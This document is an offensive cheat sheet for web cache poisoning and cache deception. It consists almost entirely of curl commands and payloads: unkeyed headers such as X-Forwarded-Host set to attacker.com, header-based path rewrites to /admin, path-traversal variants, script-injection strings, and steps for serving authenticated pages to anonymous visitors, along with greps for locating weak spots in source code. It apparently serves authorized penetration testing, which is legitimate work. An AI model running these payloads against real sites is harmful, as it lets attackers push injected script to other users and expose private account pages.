# Extended corpus — every cache-poisoning surface and payload

The complete index — the greps, the vectors, the payloads, the channels.

---

## A. The source greps — finding the surface

```bash
# the cache — the front-end layer
grep -rnoiE 'proxy_cache|cache_key|proxy_cache_key|fastcgi_cache|keys_zone|X-Cache-Status|vcl_hash|hash_data|Varnish|cache_page|flask_caching|@cache|make_cache_key|fragment|action_cache|cf-cache|edge' <src> | head -30

# the Vary — the key's discriminator
grep -rnoiE 'Vary|vary' <src> | head -10

# the unkeyed-input surface — the app reads, the cache ignores
grep -rnoiE 'X-Forwarded|X-Original|X-Rewrite|Referer|User-Agent|Accept-Language|Accept-Charset|Cookie|header|reflection|echo|request.headers' <src> | head -30

# the path-normalization boundary
grep -rnoiE 'normalize|redirect|rewrite|path|decode|urldecode|canonical' <src> | head -10

# the authenticated/deception surface
grep -rnoiE 'settings|profile|dashboard|admin|authenticated|session|personalized' <src> | head -20
```

## B. The unkeyed-header payloads — the classic vector

```bash
# the X-Forwarded-Host — a host-rewrite
curl "$BASE/page?cb=<unique>" -H 'X-Forwarded-Host: attacker.com'
# the X-Original-URL — a path-rewrite
curl "$BASE/page?cb=<unique>" -H 'X-Original-URL: /admin'
# the X-Rewrite-URL — a path-rewrite
curl "$BASE/page?cb=<unique>" -H 'X-Rewrite-URL: /admin'
# the X-Forwarded-Scheme — a scheme-downgrade
curl "$BASE/page?cb=<unique>" -H 'X-Forwarded-Scheme: http'
# the X-Forwarded-Server — a host-rewrite
curl "$BASE/page?cb=<unique>" -H 'X-Forwarded-Server: attacker.com'
# the X-Host — a host-rewrite
curl "$BASE/page?cb=<unique>" -H 'X-Host: attacker.com'
# the Referer — a reflected header
curl "$BASE/page?cb=<unique>" -H 'Referer: attacker.com/<payload>'
# the User-Agent — a reflected header
curl "$BASE/page?cb=<unique>" -A '<payload>'
# the Accept-Language — a localized response
curl "$BASE/page?cb=<unique>" -H 'Accept-Language: <payload>'
# the Accept-Charset — a charset-injection (the verified card's shape)
curl "$BASE/page?cb=<unique>" -H 'Accept-Charset: <payload>'
# a custom X- header
curl "$BASE/page?cb=<unique>" -H 'X-Custom: <payload>'
```

## C. The unkeyed-parameter payloads — a query the cache ignores

```bash
# a tracking param — utm, fbclid, gclid
curl "$BASE/page?cb=<unique>&utm_source=<payload>"
curl "$BASE/page?cb=<unique>&fbclid=<payload>"
curl "$BASE/page?cb=<unique>&gclid=<payload>"
# a param the app reflects
curl "$BASE/page?cb=<unique>&q=<payload>"
curl "$BASE/page?cb=<unique>&search=<payload>"
```

## D. The cookie payloads — a per-cookie response

```bash
curl "$BASE/page?cb=<unique>" -H 'Cookie: theme=<payload>'
curl "$BASE/page?cb=<unique>" -H 'Cookie: lang=<payload>'
curl "$BASE/page?cb=<unique>" -H 'Cookie: prefs=<payload>'
```

## E. The path-normalization payloads — a URL confusion

```bash
curl "$BASE/page/../admin?cb=<unique>"
curl "$BASE/page%2f..%2fadmin?cb=<unique>"
curl "$BASE/page/..;/admin?cb=<unique>"
curl "$BASE/static/../admin?cb=<unique>"
curl "$BASE/page//admin?cb=<unique>"
curl "$BASE/page/.;/admin?cb=<unique>"
```

## F. The authenticated-page-served-anonymously payloads — the deception

```bash
# an authenticated GET stores the privileged page
curl "$BASE/settings.html?cb=<unique>" -H 'Cookie: <auth>'
# an anonymous GET — the stored copy serves it
curl "$BASE/settings.html?cb=<unique>"   # anonymous — HIT?
```

## G. The injection payloads — the stored content

```bash
# a reflected unkeyed input carries a payload
curl "$BASE/page?cb=<unique>" -H 'X-Forwarded-Host: attacker.com/<script>'
# a charset-injection — the verified card's shape
curl "$BASE/page?cb=<unique>" -H 'Accept-Charset: <payload>'
# a payload in a reflected parameter
curl "$BASE/page?cb=<unique>&q=<script>alert(1)</script>"
```

## H. The confirmation payloads — the clean-request read

```bash
# the poisoning request — the stored copy carries the marker
curl "$BASE/page?cb=<unique>" -H 'X-Forwarded-Host: <marker>'
# the clean request — a different session, the same URL
curl "$BASE/page?cb=<unique>"   # does it reflect <marker>?
#   <marker> reflected → poisoned → confirmed
```

## I. The TTL payloads — the expiry check

```bash
# the stored entry's age — the TTL's remaining window
curl -sI "$BASE/page?cb=<unique>" | grep -iE 'age|cache-control|expires'
```

## J. The signal-to-vector map — which surface names which vector

```text
a X-Cache-Status/CF-Cache header   → a front-end cache — the keying question
a Vary header                      → the key's discriminator — what's keyed
an unkeyed reflected header        → an unkeyed-input poisoning vector
a path normalization boundary      → a path-confusion poisoning
an authenticated page + a shared cache → an authenticated-page-served-
                                        anonymously deception
a cache-buster param               → a key that includes the param —
                                     a cache-buster defeats it
a Cache-Control: no-store/private  → the page isn't cached → a different class
```
